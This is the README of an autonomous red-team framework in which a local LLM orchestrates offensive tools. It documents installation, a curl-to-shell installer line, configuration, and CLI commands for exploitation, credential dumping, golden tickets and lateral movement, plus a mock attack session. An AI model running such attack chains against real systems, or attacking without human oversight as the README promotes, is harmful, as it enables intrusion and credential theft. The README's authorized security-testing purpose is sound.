# 🦅 RedClaw - Autonomous Red Team AI Agent

<div align="center">

```
██████╗ ███████╗██████╗  ██████╗██╗      █████╗ ██╗    ██╗
██╔══██╗██╔════╝██╔══██╗██╔════╝██║     ██╔══██╗██║    ██║
██████╔╝█████╗  ██║  ██║██║     ██║     ███████║██║ █╗ ██║
██╔══██╗██╔══╝  ██║  ██║██║     ██║     ██╔══██║██║███╗██║
██║  ██║███████╗██████╔╝╚██████╗███████╗██║  ██║╚███╔███╔╝
╚═╝  ╚═╝╚══════╝╚═════╝  ╚═════╝╚══════╝╚═╝  ╚═╝ ╚══╝╚══╝ 
```

**Autonomous Penetration Testing System Powered by GLM-4 & HexStrike-AI**

[![License](https://img.shields.io/badge/License-BSD%203--Clause-blue.svg)](LICENSE)
[![Python](https://img.shields.io/badge/Python-3.10%2B-green.svg)](https://www.python.org/)
[![Security](https://img.shields.io/badge/Security-Research%20Only-red.svg)](DISCLAIMER.md)
[![Status](https://img.shields.io/badge/Status-Research%20Phase-yellow.svg)]()

</div>

---

## ⚠️ CRITICAL DISCLAIMER

**THIS IS A RESEARCH PROJECT FOR AUTHORIZED SECURITY TESTING ONLY**

RedClaw is an advanced autonomous penetration testing framework designed for:
- **Professional Security Researchers**
- **Authorized Red Team Operations**
- **Educational Purposes in Controlled Environments**
- **CTF Competitions (e.g., HackTheBox, TryHackMe)**

### Legal Warning
- ⚖️ Unauthorized access to computer systems is ILLEGAL in most jurisdictions
- 🚫 Use ONLY on systems you own or have explicit written authorization to test
- 📜 Users are solely responsible for compliance with all applicable laws
- 🎯 Designed for VM/Sandbox environments to prevent accidental system damage

**The developers assume NO responsibility for misuse of this tool.**

---

## 📖 Table of Contents

- [Overview](#-overview)
- [Key Features](#-key-features)
- [Architecture](#-architecture)
- [Technology Stack](#-technology-stack)
- [System Requirements](#-system-requirements)
- [Installation](#-installation)
- [Configuration](#-configuration)
- [Usage](#-usage)
- [Skill System](#-skill-system)
- [Security Considerations](#-security-considerations)
- [Roadmap](#-roadmap)
- [Contributing](#-contributing)
- [Citations](#-citations)
- [License](#-license)

---

## 🎯 Overview

RedClaw is a next-generation autonomous penetration testing system that combines:

- **GLM-4/GLM-4.7 Local LLM**: Advanced Chinese-developed language model with superior coding and reasoning capabilities
- **HexStrike-AI Integration**: 150+ professional security tools accessible via MCP protocol
- **Autonomous Agent Architecture**: Self-directed testing workflow from reconnaissance to reporting
- **CLI-First Design**: Terminal-based interface inspired by claude-code and gemini-cli
- **No Cloud Dependencies**: Fully local operation for maximum privacy and control

### What Makes RedClaw Different?

Unlike traditional penetration testing frameworks:

1. **True Autonomy**: Executes complete attack chains without human intervention
2. **Cognitive Decision Making**: Uses LLM reasoning to adapt tactics based on target responses
3. **Tool Orchestration**: Intelligently selects and chains 150+ security tools
4. **Context Awareness**: Maintains memory across multi-stage attacks
5. **Privacy-First**: All processing happens locally - no data leaves your infrastructure

### Design Philosophy

RedClaw is built on the principle that AI-augmented security testing should:
- Operate with minimal human guidance after initial tasking
- Learn from reconnaissance to inform exploitation strategies
- Validate findings before reporting to minimize false positives
- Execute in isolated environments to prevent accidental damage
- Provide comprehensive, audit-ready documentation

---

## ✨ Key Features

### 🤖 Autonomous Agent Capabilities

- **Multi-Phase Attack Execution**
  - Reconnaissance & OSINT gathering
  - Port scanning & service enumeration
  - Vulnerability identification & prioritization
  - Exploitation & privilege escalation
  - Post-exploitation & lateral movement
  - Data exfiltration simulation
  - Evidence cleanup & reporting

- **Intelligent Tool Selection**
  - Contextual tool choice based on target characteristics
  - Automatic parameter optimization
  - Fallback strategies when primary tools fail
  - Result correlation across multiple tools

- **Self-Correcting Behavior**
  - Learns from failed attempts
  - Adjusts tactics based on defensive responses
  - Validates exploits before moving to next phase

### 🛠️ Integrated Security Tools (via HexStrike-AI)

#### Network Analysis
- Nmap (port scanning, OS detection)
- Masscan (fast port scanner)
- ZMap (Internet-wide scanner)
- Netdiscover (ARP reconnaissance)

#### Web Application Testing
- Nikto (web server scanner)
- SQLMap (SQL injection)
- XSStrike (XSS detection)
- DirBuster/GoBuster (directory brute-forcing)
- WPScan (WordPress security scanner)
- Nuclei (vulnerability templates)

#### Exploitation Frameworks
- Metasploit Framework (full integration)
- ExploitDB / SearchSploit
- RouterSploit (embedded device exploitation)
- AutoSploit (automated Metasploit)

#### Post-Exploitation
- Mimikatz (credential extraction)
- PowerShell Empire (C2 framework)
- BloodHound (Active Directory analysis)
- GhostPack (AD exploitation suite)
  - Rubeus (Kerberos attacks)
  - Certify (AD CS exploitation)
  - Seatbelt (host reconnaissance)
  - SharpUp (privilege escalation)

#### Malware Analysis
- Ghidra (reverse engineering)
- Radare2 (binary analysis)
- YARA (malware identification)

#### Wireless
- Aircrack-ng (WiFi security)
- Reaver (WPS attacks)
- Bully (WPS brute force)

#### Password Attacks
- Hashcat (GPU-accelerated cracking)
- John the Ripper (password cracking)
- Hydra (network login brute-forcer)
- CrackMapExec (AD post-exploitation)

#### Additional Tools
- 100+ more tools from infosecn1nja/Red-Teaming-Toolkit
- Custom tool integration support

### 🧠 Local LLM Integration

**GLM-4.7** (Primary Model)
- 30B parameters (MoE architecture, 3B active)
- Optimized for coding and agentic workflows
- 128K-200K token context window
- Thinking mode for complex reasoning
- Native tool calling support
- Multilingual (English/Chinese)

**Alternative Models Supported**
- GLM-4.6 (355B total, 32B active)
- Qwen3-32B (community favorite)
- Llama 3.1+ models
- Custom Ollama models

### 🎮 CLI Interface Features

- **Interactive Terminal UI**
  - Real-time attack progress visualization
  - Live tool output streaming
  - Session persistence & restoration
  - Command history & autocompletion

- **Session Management**
  - Save/restore attack sessions
  - Multi-target campaign tracking
  - Result archiving & export

- **Reporting Engine**
  - Markdown report generation
  - JSON/XML output for integration
  - Evidence collection & categorization
  - Compliance-ready documentation (OWASP, PTES)

---

## 🏗️ Architecture

### High-Level System Design

```
┌─────────────────────────────────────────────────────────────────┐
│                         USER INTERFACE                          │
│  ┌───────────────────────────────────────────────────────────┐  │
│  │        RedClaw CLI (Inspired by claude-code)              │  │
│  │  • Interactive terminal with rich formatting             │  │
│  │  • Session management & persistence                      │  │
│  │  • Real-time progress tracking                           │  │
│  │  • Command history & tab completion                      │  │
│  └───────────────────────────────────────────────────────────┘  │
└─────────────────────────┬───────────────────────────────────────┘
                          │
                          ▼
┌─────────────────────────────────────────────────────────────────┐
│                    ORCHESTRATION LAYER                          │
│  ┌───────────────────────────────────────────────────────────┐  │
│  │            Agent Orchestrator (Brain)                     │  │
│  │  • Task decomposition & planning                         │  │
│  │  • Tool selection & parameter optimization               │  │
│  │  • Multi-stage attack coordination                       │  │
│  │  • Risk assessment & exploit validation                  │  │
│  └───────────────────────────────────────────────────────────┘  │
│                                                                   │
│  ┌───────────────────────────────────────────────────────────┐  │
│  │              State Machine Controller                     │  │
│  │  • Phase tracking (recon → scan → exploit → post-exp)   │  │
│  │  • Error handling & recovery                            │  │
│  │  • Retry logic with exponential backoff                 │  │
│  └───────────────────────────────────────────────────────────┘  │
│                                                                   │
│  ┌───────────────────────────────────────────────────────────┐  │
│  │            Memory & Context Manager                       │  │
│  │  • Vector database (ChromaDB/FAISS)                     │  │
│  │  • Attack history & learned patterns                    │  │
│  │  • Tool effectiveness tracking                          │  │
│  │  • Target fingerprint database                          │  │
│  └───────────────────────────────────────────────────────────┘  │
└─────────────────────────┬───────────────────────────────────────┘
                          │
                          ▼
┌─────────────────────────────────────────────────────────────────┐
│                      AI REASONING CORE                          │
│  ┌───────────────────────────────────────────────────────────┐  │
│  │         GLM-4.7 Local LLM (via Ollama/vLLM)              │  │
│  │  • Agentic workflow planning                             │  │
│  │  • Tool call generation                                  │  │
│  │  • Result analysis & correlation                         │  │
│  │  • Exploit selection reasoning                           │  │
│  │  • Natural language reporting                            │  │
│  └───────────────────────────────────────────────────────────┘  │
│                                                                   │
│  ┌───────────────────────────────────────────────────────────┐  │
│  │           RAG (Retrieval-Augmented Generation)            │  │
│  │  • CVE database integration                              │  │
│  │  • Exploit database (ExploitDB, Packet Storm)           │  │
│  │  • Attack pattern library                               │  │
│  │  • Vulnerability research papers                        │  │
│  └───────────────────────────────────────────────────────────┘  │
└─────────────────────────┬───────────────────────────────────────┘
                          │
                          ▼
┌─────────────────────────────────────────────────────────────────┐
│                   SPECIALIZED AGENTS                            │
│  ┌──────────────┐  ┌──────────────┐  ┌──────────────┐          │
│  │   Recon      │  │  Scanning    │  │ Exploitation │          │
│  │   Agent      │  │   Agent      │  │    Agent     │          │
│  │              │  │              │  │              │          │
│  │ • OSINT      │  │ • Port scan  │  │ • Vuln verify│          │
│  │ • DNS enum   │  │ • Service ID │  │ • Exploit sel│          │
│  │ • Subdomain  │  │ • Banner grab│  │ • Payload gen│          │
│  │ • Metadata   │  │ • Vuln detect│  │ • Persistence│          │
│  └──────────────┘  └──────────────┘  └──────────────┘          │
│                                                                   │
│  ┌──────────────┐  ┌──────────────┐  ┌──────────────┐          │
│  │  Post-Exp    │  │   Network    │  │  Reporting   │          │
│  │   Agent      │  │   Agent      │  │    Agent     │          │
│  │              │  │              │  │              │          │
│  │ • Privilege  │  │ • Lateral    │  │ • Evidence   │          │
│  │ • Cred dump  │  │ • Pivot      │  │ • Timeline   │          │
│  │ • Data exfil │  │ • C2 setup   │  │ • IOC extract│          │
│  │ • Cleanup    │  │ • Tunneling  │  │ • Report gen │          │
│  └──────────────┘  └──────────────┘  └──────────────┘          │
└─────────────────────────┬───────────────────────────────────────┘
                          │
                          ▼
┌─────────────────────────────────────────────────────────────────┐
│                    TOOL EXECUTION LAYER                         │
│  ┌───────────────────────────────────────────────────────────┐  │
│  │         HexStrike-AI MCP Server (Port 8888)              │  │
│  │  • 150+ cybersecurity tool wrappers                      │  │
│  │  • Standardized tool interface                           │  │
│  │  • Output parsing & normalization                        │  │
│  │  • Error handling & recovery                             │  │
│  └───────────────────────────────────────────────────────────┘  │
│                                                                   │
│  ┌───────────────────────────────────────────────────────────┐  │
│  │              Tool Executor (Sandboxed)                    │  │
│  │  • Secure command execution in Docker/VM                 │  │
│  │  • Resource limiting (CPU, memory, network)              │  │
│  │  • Output capture & logging                              │  │
│  │  • Timeout management                                     │  │
│  └───────────────────────────────────────────────────────────┘  │
└─────────────────────────┬───────────────────────────────────────┘
                          │
                          ▼
┌─────────────────────────────────────────────────────────────────┐
│                    SECURITY TOOLKIT                             │
│  ┌──────────┐ ┌──────────┐ ┌──────────┐ ┌──────────┐          │
│  │  Nmap    │ │ Metasploit│ │ SQLMap  │ │ Mimikatz│          │
│  └──────────┘ └──────────┘ └──────────┘ └──────────┘          │
│  ┌──────────┐ ┌──────────┐ ┌──────────┐ ┌──────────┐          │
│  │ Nuclei   │ │  Empire  │ │ Ghidra  │ │ BloodHound│         │
│  └──────────┘ └──────────┘ └──────────┘ └──────────┘          │
│  ┌──────────┐ ┌──────────┐ ┌──────────┐ ┌──────────┐          │
│  │GhostPack │ │ Hashcat  │ │ Nikto   │ │ +140 More│          │
│  └──────────┘ └──────────┘ └──────────┘ └──────────┘          │
└─────────────────────────────────────────────────────────────────┘
```

### Agent Communication Flow

```mermaid
sequenceDiagram
    participant User
    participant CLI
    participant Orchestrator
    participant GLM_4_7
    participant HexStrike
    participant Tools
    
    User->>CLI: "Scan and exploit 10.10.10.5"
    CLI->>Orchestrator: Parse task & validate target
    Orchestrator->>GLM_4_7: Generate attack plan
    GLM_4_7->>Orchestrator: [Recon, Scan, Exploit, Post-Exp]
    
    loop Attack Phases
        Orchestrator->>GLM_4_7: Generate tool commands
        GLM_4_7->>HexStrike: Execute nmap/metasploit/etc
        HexStrike->>Tools: Run actual security tools
        Tools->>HexStrike: Return results
        HexStrike->>GLM_4_7: Parsed output
        GLM_4_7->>Orchestrator: Analysis & next action
    end
    
    Orchestrator->>CLI: Final report
    CLI->>User: Display findings
```

### Data Flow Architecture

```
┌──────────────┐
│   User       │
│   Input      │
└──────┬───────┘
       │
       ▼
┌──────────────────────────────────────┐
│  Task Parser & Validator             │
│  • Syntax checking                   │
│  • Target validation                 │
│  • Scope verification                │
└──────┬───────────────────────────────┘
       │
       ▼
┌──────────────────────────────────────┐
│  Planning Phase (GLM-4.7)            │
│  • Generate attack graph             │
│  • Identify dependencies             │
│  • Estimate time/resources           │
└──────┬───────────────────────────────┘
       │
       ▼
┌──────────────────────────────────────┐
│  Execution Loop                      │
│  ┌────────────────────────────────┐  │
│  │ While not complete:            │  │
│  │   1. Get current phase         │  │
│  │   2. Select appropriate tool   │  │
│  │   3. Generate parameters       │  │
│  │   4. Execute via HexStrike     │  │
│  │   5. Parse & analyze results   │  │
│  │   6. Update state & memory     │  │
│  │   7. Decide next action        │  │
│  └────────────────────────────────┘  │
└──────┬───────────────────────────────┘
       │
       ▼
┌──────────────────────────────────────┐
│  Validation & Quality Control        │
│  • False positive detection          │
│  • Exploit verification              │
│  • Impact assessment                 │
└──────┬───────────────────────────────┘
       │
       ▼
┌──────────────────────────────────────┐
│  Report Generation                   │
│  • Evidence compilation              │
│  • Timeline construction             │
│  • Remediation suggestions           │
│  • Executive summary                 │
└──────┬───────────────────────────────┘
       │
       ▼
┌──────────────┐
│   Output     │
│   (MD/JSON)  │
└──────────────┘
```

---

## 🔧 Technology Stack

### Core Components

| Component | Technology | Purpose |
|-----------|-----------|---------|
| **LLM Inference** | vLLM / Ollama / SGLang | Local GLM-4.7 model serving |
| **MCP Protocol** | FastMCP (Python) | Tool orchestration via Model Context Protocol |
| **Agent Framework** | LangGraph / CrewAI | Multi-agent coordination |
| **CLI Interface** | Rich / Typer / Click | Terminal UI with live updates |
| **Vector DB** | ChromaDB / FAISS | Memory & RAG storage |
| **Database** | PostgreSQL + SQLAlchemy | Session & results storage |
| **Task Queue** | Celery + Redis | Asynchronous task management |
| **Sandboxing** | Docker / LXC | Tool isolation |
| **Logging** | Loguru | Structured logging |
| **API** | FastAPI | Optional web interface |

### Security Tools Integration

| Category | Integration Method |
|----------|-------------------|
| **HexStrike-AI** | MCP Server (REST API + MCP tools) |
| **Metasploit** | msfrpc + direct API |
| **Empire** | REST API |
| **BloodHound** | Neo4j queries |
| **Custom Tools** | Shell execution wrapper |

### Model Serving Options

```python
# Option 1: Ollama (Recommended for ease of use)
ollama run glm4.7-flash:latest

# Option 2: vLLM (Better performance)
vllm serve zai-org/GLM-4.7-FP8 --tensor-parallel-size 4

# Option 3: SGLang (Best throughput)
python -m sglang.launch_server --model zai-org/GLM-4.7 --port 8001
```

---

## 💻 System Requirements

### Minimum Requirements

- **OS**: Linux (Ubuntu 22.04+, Kali 2024+, Debian 12+)
- **CPU**: 8 cores (16 threads recommended)
- **RAM**: 24GB (for GLM-4.7-Flash quantized)
- **GPU**: 24GB VRAM (RTX 3090, RTX 4090, A5000)
  - Or 2x RTX 3090 (48GB total)
- **Storage**: 100GB SSD (for models + tools + datasets)
- **Network**: Isolated lab environment recommended

### Recommended Requirements

- **CPU**: AMD Threadripper / Intel Xeon (32+ cores)
- **RAM**: 64GB DDR4/DDR5
- **GPU**: NVIDIA A100 (80GB) or 4x RTX 4090
- **Storage**: 500GB NVMe SSD
- **Network**: Dedicated VLAN for security testing

### Software Dependencies

```bash
# Core
- Python 3.10+
- Docker 24.0+
- CUDA 12.1+ (for GPU inference)

# LLM Inference
- Ollama 0.1.20+ OR
- vLLM 0.3.0+ OR
- SGLang 0.2.0+

# Security Tools
- Kali Linux tools (or manual installation)
- Metasploit Framework 6.3+
- HexStrike-AI
- Neo4j 5.0+ (for BloodHound)
```

---

## 📦 Installation

### Quick Start (Docker - Recommended)

```bash
# 1. Clone repository
git clone --recursive https://github.com/your-org/redclaw.git
cd redclaw

# 2. Run installation script
./scripts/install.sh

# 3. Pull GLM-4.7 model
ollama pull glm4.7-flash

# 4. Start HexStrike-AI MCP server
cd third_party/hexstrike-ai
python3 hexstrike_mcp.py --server http://localhost:8888

# 5. Launch RedClaw CLI
redclaw init
redclaw config --model glm4.7-flash
redclaw start
```

### Manual Installation

#### Step 1: System Preparation

```bash
# Update system
sudo apt update && sudo apt upgrade -y

# Install system dependencies
sudo apt install -y \
    build-essential cmake git curl wget \
    python3-dev python3-pip python3-venv \
    libssl-dev libffi-dev libxml2-dev libxslt1-dev \
    postgresql postgresql-contrib redis-server \
    docker.io docker-compose

# Add user to docker group
sudo usermod -aG docker $USER
newgrp docker
```

#### Step 2: Python Environment

```bash
# Create virtual environment
python3 -m venv venv
source venv/bin/activate

# Install Python dependencies
pip install --upgrade pip wheel setuptools
pip install -r requirements.txt
```

#### Step 3: LLM Setup (Choose One)

**Option A: Ollama (Easiest)**

```bash
# Install Ollama
curl -fsSL https://ollama.com/install.sh | sh

# Pull GLM-4.7
ollama pull glm4.7-flash

# Verify
ollama list
```

**Option B: vLLM (Best Performance)**

```bash
# Install vLLM
pip install vllm

# Download GLM-4.7 weights
huggingface-cli download zai-org/GLM-4.7-FP8 \
    --local-dir models/glm-4.7-fp8

# Start server
vllm serve models/glm-4.7-fp8 \
    --tensor-parallel-size 2 \
    --gpu-memory-utilization 0.9 \
    --port 8001
```

**Option C: SGLang (Best Throughput)**

```bash
pip install "sglang[all]"

sglang.launch_server \
    --model-path zai-org/GLM-4.7 \
    --host 0.0.0.0 \
    --port 8001 \
    --tp 2
```

#### Step 4: HexStrike-AI Integration

```bash
# Clone HexStrike-AI
git clone https://github.com/0x4m4/hexstrike-ai.git third_party/hexstrike-ai
cd third_party/hexstrike-ai

# Install dependencies
pip install -r requirements.txt

# Configure MCP
cp config.example.json config.json
nano config.json  # Edit configuration

# Start MCP server
python3 hexstrike_mcp.py --server http://localhost:8888 &
```

#### Step 5: Database Setup

```bash
# PostgreSQL
sudo -u postgres psql <<EOF
CREATE DATABASE redclaw;
CREATE USER redclaw_user WITH PASSWORD 'your_secure_password';
GRANT ALL PRIVILEGES ON DATABASE redclaw TO redclaw_user;
EOF

# Neo4j (for BloodHound)
docker run -d \
    --name neo4j \
    -p 7474:7474 -p 7687:7687 \
    -e NEO4J_AUTH=neo4j/bloodhound \
    neo4j:5.13
```

#### Step 6: Security Tools Installation

```bash
# If not on Kali, install essential tools
sudo apt install -y \
    nmap masscan nikto sqlmap \
    metasploit-framework john hashcat hydra \
    aircrack-ng wireshark tcpdump

# Install additional tools via script
sudo bash scripts/install_tools.sh

# Verify installations
redclaw doctor
```

#### Step 7: RedClaw Configuration

```bash
# Initialize configuration
redclaw init

# Configure model endpoint
redclaw config set llm.endpoint http://localhost:11434/api/generate
redclaw config set llm.model glm4.7-flash
redclaw config set llm.context_length 110000

# Configure HexStrike
redclaw config set hexstrike.endpoint http://localhost:8888
redclaw config set hexstrike.timeout 300

# Set workspace
redclaw config set workspace.path ~/redclaw-workspace
redclaw config set workspace.isolated true

# Verify configuration
redclaw config show
```

### Verification

```bash
# Check all components
redclaw doctor

# Expected output:
# ✓ GLM-4.7 model accessible
# ✓ HexStrike-AI MCP server running
# ✓ Database connection OK
# ✓ 150+ security tools available
# ✓ Docker environment ready
# ✓ Vector database initialized
```

---

## ⚙️ Configuration

### Main Configuration File (`~/.redclaw/config.yaml`)

```yaml
# LLM Configuration
llm:
  provider: "ollama"  # ollama | vllm | sglang
  endpoint: "http://localhost:11434/api/generate"
  model: "glm4.7-flash"
  context_length: 110000
  temperature: 0.3
  top_p: 0.8
  thinking_mode: true  # Enable for complex reasoning
  max_retries: 3

# HexStrike-AI Integration
hexstrike:
  endpoint: "http://localhost:8888"
  timeout: 300
  max_concurrent_tools: 5
  auto_recovery: true

# Agent Configuration
agents:
  recon:
    enabled: true
    aggressive: false
    timeout: 600
  
  scanning:
    enabled: true
    port_scan_speed: "normal"  # slow | normal | fast | insane
    service_detection: true
  
  exploitation:
    enabled: true
    auto_exploit: false  # Require confirmation before exploitation
    max_attempts: 3
  
  post_exploitation:
    enabled: true
    privilege_escalation: true
    lateral_movement: false  # Disable by default for safety

# Workspace
workspace:
  path: "~/redclaw-workspace"
  isolated: true  # Use Docker sandbox
  auto_cleanup: true
  max_sessions: 10

# Memory & RAG
memory:
  vector_db: "chromadb"  # chromadb | faiss
  storage_path: "~/.redclaw/memory"
  embedding_model: "sentence-transformers/all-MiniLM-L6-v2"
  max_history: 1000

# Database
database:
  type: "postgresql"
  host: "localhost"
  port: 5432
  name: "redclaw"
  user: "redclaw_user"
  password: "your_secure_password"

# Reporting
reporting:
  format: "markdown"  # markdown | json | html | pdf
  include_screenshots: true
  include_raw_output: false
  compliance_frameworks: ["OWASP", "PTES"]

# Security
security:
  scope_validation: true  # Verify target is authorized
  rate_limiting: true
  max_bandwidth: "10mbps"  # Prevent network flooding
  blacklist_cidrs:
    - "10.0.0.0/8"  # Example: exclude internal ranges
    - "192.168.0.0/16"

# Logging
logging:
  level: "INFO"  # DEBUG | INFO | WARNING | ERROR
  file: "~/.redclaw/logs/redclaw.log"
  max_size: "100MB"
  backup_count: 5
```

### Environment Variables

```bash
# Create .env file
cat > ~/.redclaw/.env <<EOF
# LLM API Keys (if using cloud providers as fallback)
ANTHROPIC_API_KEY=sk-ant-...
OPENAI_API_KEY=sk-...

# Database
DATABASE_URL=postgresql://redclaw_user:password@localhost/redclaw

# HexStrike
HEXSTRIKE_API_URL=http://localhost:8888

# Redis (for task queue)
REDIS_URL=redis://localhost:6379/0

# Neo4j (BloodHound)
NEO4J_URI=bolt://localhost:7687
NEO4J_USER=neo4j
NEO4J_PASSWORD=bloodhound

# Security
REDCLAW_SCOPE_FILE=~/.redclaw/authorized_targets.txt
REDCLAW_MAX_THREADS=16
EOF
```

---

## 🚀 Usage

### CLI Commands

#### Basic Usage

```bash
# Start interactive CLI
redclaw

# Or directly specify target
redclaw scan 192.168.1.100

# Advanced usage with specific phases
redclaw attack --target 192.168.1.100 \
    --phases recon,scan,exploit \
    --profile aggressive \
    --output report.md
```

#### Command Reference

```bash
# Configuration
redclaw init                    # Initialize configuration
redclaw config show             # Display current configuration
redclaw config set key value    # Set configuration value
redclaw doctor                  # Check system health

# Session Management
redclaw session list            # List all sessions
redclaw session restore <id>    # Restore previous session
redclaw session delete <id>     # Delete session
redclaw session export <id>     # Export session data

# Target Management
redclaw targets add <ip/cidr>   # Add authorized target
redclaw targets list            # List authorized targets
redclaw targets remove <id>     # Remove target

# Scanning & Enumeration
redclaw scan <target>           # Quick scan
redclaw recon <target>          # Full reconnaissance
redclaw enum --web <url>        # Web application enumeration
redclaw enum --ad <domain>      # Active Directory enumeration

# Exploitation
redclaw exploit <target>        # Auto-exploit vulnerabilities
redclaw exploit --vuln CVE-2024-1234 <target>  # Specific CVE
redclaw exploit --list          # List available exploits

# Post-Exploitation
redclaw post-exploit --shell <shell_id>   # Post-exploitation actions
redclaw loot <target>                     # Gather credentials/data
redclaw pivot --from <host1> --to <host2>  # Lateral movement

# Reporting
redclaw report generate --session <id>    # Generate report
redclaw report export --format pdf        # Export to PDF
redclaw export --findings findings.json   # Export findings

# Advanced
redclaw skill install <skill_name>        # Install custom skill
redclaw skill list                        # List available skills
redclaw benchmark --target ctf_box        # Run against CTF challenge
redclaw update                            # Update tools & database
```

### Interactive Mode

```bash
$ redclaw

██████╗ ███████╗██████╗  ██████╗██╗      █████╗ ██╗    ██╗
██╔══██╗██╔════╝██╔══██╗██╔════╝██║     ██╔══██╗██║    ██║
██████╔╝█████╗  ██║  ██║██║     ██║     ███████║██║ █╗ ██║
██╔══██╗██╔══╝  ██║  ██║██║     ██║     ██╔══██║██║███╗██║
██║  ██║███████╗██████╔╝╚██████╗███████╗██║  ██║╚███╔███╔╝
╚═╝  ╚═╝╚══════╝╚═════╝  ╚═════╝╚══════╝╚═╝  ╚═╝ ╚══╝╚══╝

Autonomous Red Team AI Agent v1.0.0
GLM-4.7 Loaded | HexStrike Connected | 150+ Tools Ready

redclaw> set target 10.10.11.234
✓ Target 10.10.11.234 added to scope

redclaw> set mode auto
✓ Autonomous mode enabled (full attack chain)

redclaw> start
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Phase 1: Reconnaissance
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
[*] Running OSINT gathering...
[*] DNS enumeration: 5 subdomains found
[*] Port scanning: 3 open ports detected
    - 22/tcp  (SSH - OpenSSH 8.9p1)
    - 80/tcp  (HTTP - Apache 2.4.52)
    - 3306/tcp (MySQL 8.0.30)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Phase 2: Vulnerability Scanning
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
[*] Analyzing web application...
[+] Nuclei found: SQL injection in login form
[+] CVE-2024-1234: Apache mod_proxy RCE
[+] Weak MySQL credentials detected

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Phase 3: Exploitation
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
[!] Attempting exploitation...
[+] SQLMap successful: Database dumped
[+] Apache RCE exploit successful: Shell obtained
[*] User shell: www-data@webserver

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Phase 4: Post-Exploitation
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
[*] Privilege escalation attempts...
[+] LinPEAS found: Kernel exploit CVE-2024-5678
[+] Root access obtained!
[*] Credentials harvested: 15 users
[*] Flags captured: user.txt, root.txt

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Attack Complete! 🎯
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Time: 45 minutes
Findings: 3 Critical, 5 High, 12 Medium
Report: report_10.10.11.234_20260209.md

redclaw> report show
```

### Example Workflows

#### 1. CTF Challenge (HackTheBox Style)

```bash
# Scenario: Pwn a HTB machine

# Add target
redclaw targets add 10.10.11.234 --name "HTB-Box"

# Run automated attack
redclaw attack 10.10.11.234 --mode auto --flags user.txt,root.txt

# Monitor progress
redclaw session tail

# Once complete, view findings
redclaw report show --session latest
```

#### 2. Web Application Pentest

```bash
# Scope definition
redclaw targets add https://example.com --scope web

# Web-focused enumeration
redclaw enum --web https://example.com \
    --crawl \
    --tech-detect \
    --dir-brute

# Vulnerability scanning
redclaw scan --web https://example.com \
    --checks sqli,xss,lfi,rfi,xxe

# Exploitation (manual confirmation)
redclaw exploit --interactive

# Generate compliance report
redclaw report generate --format pdf --standard OWASP-ASVS
```

#### 3. Active Directory Assessment

```bash
# AD enumeration
redclaw enum --ad corp.local \
    --bloodhound \
    --user-enum \
    --smb-shares

# Kerberoasting
redclaw attack --ad corp.local --technique kerberoast

# Domain admin path analysis
redclaw analyze --bloodhound --from user@corp.local --to "Domain Admins"

# Post-exploitation
redclaw post-exploit --ad \
    --dump-ntds \
    --dump-lsass \
    --golden-ticket
```

#### 4. Network-Wide Assessment

```bash
# Network scan
redclaw scan 10.10.10.0/24 \
    --fast-scan \
    --service-detect \
    --os-detect

# Identify attack surface
redclaw analyze --network 10.10.10.0/24 --prioritize

# Automated exploitation
redclaw exploit --network 10.10.10.0/24 \
    --auto \
    --max-concurrent 5 \
    --stop-on-success

# Generate network map
redclaw visualize --network --output network_graph.svg
```

---

## 🎓 Skill System

RedClaw uses a modular "skill" system for extensibility. Skills are Python modules that define specialized attack techniques or tool integrations.

### Core Skills (Built-in)

| Skill | Description | Tools Used |
|-------|-------------|------------|
| `recon/osint` | OSINT gathering from public sources | theHarvester, Shodan, Amass |
| `recon/dns` | DNS enumeration & zone transfer | dig, fierce, dnsrecon |
| `scan/network` | Network & port scanning | Nmap, Masscan, ZMap |
| `scan/web` | Web application scanning | Nikto, WPScan, DirBuster |
| `vuln/nuclei` | Template-based vuln detection | Nuclei, custom templates |
| `exploit/metasploit` | Metasploit exploitation | Metasploit Framework |
| `exploit/web` | Web-specific exploits | SQLMap, XSStrike |
| `post/privilege` | Privilege escalation | LinPEAS, WinPEAS |
| `post/credentials` | Credential harvesting | Mimikatz, LaZagne |
| `post/bloodhound` | AD attack path analysis | BloodHound, SharpHound |
| `lateral/smb` | SMB-based lateral movement | CrackMapExec, PsExec |

### Custom Skill Development

Create a custom skill:

```python
# ~/.redclaw/skills/custom_scan.py

from redclaw.core.skill import Skill, tool_call
from redclaw.core.decorators import requires_tool

class CustomScanSkill(Skill):
    """Custom scanning skill with specialized logic"""
    
    name = "custom_scan"
    description = "Performs custom vulnerability scan"
    phase = "scanning"
    
    @requires_tool("my_custom_scanner")
    @tool_call
    async def execute(self, target: str, options: dict) -> dict:
        """
        Main execution logic
        
        Args:
            target: Target IP/hostname
            options: Additional parameters
            
        Returns:
            dict: Scan results
        """
        # Use HexStrike to call tool
        result = await self.hexstrike.call_tool(
            "execute_command",
            {
                "command": f"my_custom_scanner -t {target} --verbose",
                "timeout": 300
            }
        )
        
        # Parse results using LLM
        parsed = await self.llm.analyze(
            result["output"],
            task="Extract vulnerabilities from scan output"
        )
        
        return {
            "vulnerabilities": parsed["vulns"],
            "risk_level": parsed["risk"],
            "raw_output": result["output"]
        }
    
    def validate_results(self, results: dict) -> bool:
        """Validate scan results to reduce false positives"""
        return len(results["vulnerabilities"]) > 0

# Register skill
def register():
    return CustomScanSkill()
```

Install custom skill:

```bash
redclaw skill install custom_scan.py
redclaw skill enable custom_scan
```

Use in attack workflow:

```bash
redclaw scan 192.168.1.100 --skill custom_scan
```

### Community Skills

Browse and install community-contributed skills:

```bash
# Search skill marketplace
redclaw skill search "web fuzzing"

# Install community skill
redclaw skill install community/advanced_sqli

# Update all skills
redclaw skill update
```

---

## 🛡️ Security Considerations

### Isolation & Containment

**RedClaw operates in isolated environments by default to prevent:**

1. **Accidental System Damage**
   - All tool execution happens in Docker containers
   - Filesystem access is restricted
   - Network access is scoped to target ranges only

